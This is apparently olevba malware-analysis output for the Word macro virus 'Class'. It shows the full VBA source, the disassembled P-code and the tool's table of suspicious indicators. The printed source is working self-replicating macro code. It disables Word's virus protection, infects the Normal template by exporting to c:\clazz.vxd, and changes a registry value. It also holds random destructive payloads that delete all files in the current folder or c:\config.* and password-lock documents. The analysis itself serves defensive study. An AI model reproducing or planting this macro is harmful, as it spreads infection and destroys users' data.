olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
On Error GoTo Hell
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
dead = False
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Options.VirusProtection = dead
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Options.SaveNormalPrompt = dead
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Options.ConfirmConversions = dead
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Clazz"
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Mzg = Int(Rnd * 66)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If Mzg = 66 Then MsgBox Chr(40) + Chr(99) + Chr(41) + Chr(32) + Chr(86) + Chr(105) + Chr(112) + Chr(101) + Chr(114) + Chr(105) + Chr(122) + Chr(101) + Chr(32) + Chr(47) + Chr(32) + Chr(84) + Chr(78) + Chr(84), 0, Chr(67) + Chr(108) + Chr(97) + Chr(122) + Chr(122) + Chr(32) + Chr(118) + Chr(49) + Chr(46) + Chr(48)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
ac = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
dc = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If dc > 10 And ad > 0 Then End
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If dc < 10 Then
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Set goat = NormalTemplate.VBProject.VBComponents.Item(1)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
ActiveDocument.VBProject.VBComponents.Item(1).Name = goat.Name
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\clazz.vxd"
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
End If
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If ac = 0 Then Set goat = ActiveDocument.VBProject.VBComponents.Item(1)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
goat.codemodule.AddFromFile ("c:\clazz.vxd")
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
goat.codemodule.deletelines 1, 4
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If dc < 10 Then goat.codemodule.replaceline 1, "Sub AutoClose()" & " '" & Now & Application.UserName & Application.ActiveWindow & Application.ActivePrinter
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If dc < 10 Then goat.codemodule.replaceline 63, "Sub ToolsMacro()" & " '" & Now & Application.UserName & Application.ActiveWindow & Application.ActivePrinter
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
rn = Int(Rnd * 9999999)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
With goat.codemodule
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
    For i = 2 To 76 Step 2
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
    .replaceline i, "'" & rn & Now & Application.UserName & rn & Application.ActiveWindow & Application.ActivePrinter & rn
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
    Next i
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
End With
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Hell:
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If dc > 70 And ac = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
End Sub
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Sub ViewVBCode()
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
On Error GoTo Hell
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Stealth = Int(Rnd * 4)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If Stealth = 3 Then Application.ActiveDocument.Password = Chr(67) + Chr(108) + Chr(97) + Chr(122) + Chr(122)
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If Stealth = 2 Then Kill "*.*"
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
If Stealth = 4 Then Kill "c:\config.*"
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
Hell:
'97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bs
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9427 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #2:
' 	OnError Hell 
' Line #3:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #4:
' 	LitVarSpecial (False)
' 	St dead 
' Line #5:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #6:
' 	Ld dead 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #8:
' 	Ld dead 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #10:
' 	Ld dead 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #12:
' 	LitStr 0x0005 "Clazz"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	St Mzg 
' Line #15:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #16:
' 	Ld Mzg 
' 	LitDI2 0x0042 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #17:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #18:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ac 
' Line #19:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #20:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St dc 
' Line #21:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #22:
' 	Ld dc 
' 	LitDI2 0x000A 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #23:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #24:
' 	Ld dc 
' 	LitDI2 0x000A 
' 	Lt 
' 	IfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set goat 
' Line #27:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #28:
' 	Ld goat 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #29:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #30:
' 	LitStr 0x000C "c:\clazz.vxd"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #34:
' 	Ld ac 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set goat 
' 	EndIf 
' Line #35:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #36:
' 	LitStr 0x000C "c:\clazz.vxd"
' 	Paren 
' 	Ld goat 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #38:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld goat 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #39:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #40:
' 	Ld dc 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitStr 0x0002 " '"
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld goat 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #41:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #42:
' 	Ld dc 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x003F 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	LitStr 0x0002 " '"
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld goat 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #44:
' 	Ld Rnd 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	St rn 
' Line #45:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #46:
' 	StartWithExpr 
' 	Ld goat 
' 	MemLd codemodule 
' 	With 
' Line #47:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x004C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #49:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #50:
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld rn 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #51:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #54:
' 	EndWith 
' Line #55:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #56:
' 	Label Hell 
' Line #57:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #58:
' 	Ld dc 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ac 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #59:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #60:
' 	EndSub 
' Line #61:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #62:
' 	FuncDefn (Sub ViewVBCode())
' Line #63:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #64:
' 	OnError Hell 
' Line #65:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #66:
' 	Ld Rnd 
' 	LitDI2 0x0004 
' 	Mul 
' 	FnInt 
' 	St Stealth 
' Line #67:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #68:
' 	Ld Stealth 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #69:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #70:
' 	Ld Stealth 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #71:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #72:
' 	Ld Stealth 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "c:\config.*"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #73:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #74:
' 	Label Hell 
' Line #75:
' 	QuoteRem 0x0000 0x0066 "97907781/26/99 1:44:07 PMJason Billingham9790778under_the_bridgeEPSON Stylus COLOR 300 on LPT1:9790778"
' Line #76:
' 	EndSub 
' Line #77:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

